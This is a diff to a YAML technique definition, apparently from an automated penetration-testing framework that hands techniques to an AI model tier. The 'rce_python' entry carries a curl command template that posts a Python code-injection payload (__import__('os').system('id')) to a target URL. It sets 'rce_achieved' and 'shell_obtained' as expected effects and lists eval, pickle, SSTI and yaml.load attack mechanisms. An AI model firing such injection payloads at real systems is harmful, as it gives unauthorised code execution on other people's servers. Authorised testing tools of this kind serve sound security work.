@@ -2,15 +2,20 @@ name: rce_python
 category: web
 description: Python RCE techniques
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -d 'input=__import__("os").system("id")'"
-parser: null
+command_template: 'curl -s ''{target_url}'' -d ''input=__import__("os").system("id")''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- rce_achieved
+- shell_obtained
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Python RCE: eval/exec injection, pickle deserialization, SSTI (Jinja2/Mako), input() in Python 2, yaml.load() unsafe deserialization."
+mechanism: 'Python RCE: eval/exec injection, pickle deserialization, SSTI (Jinja2/Mako),
+  input() in Python 2, yaml.load() unsafe deserialization.'
+hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
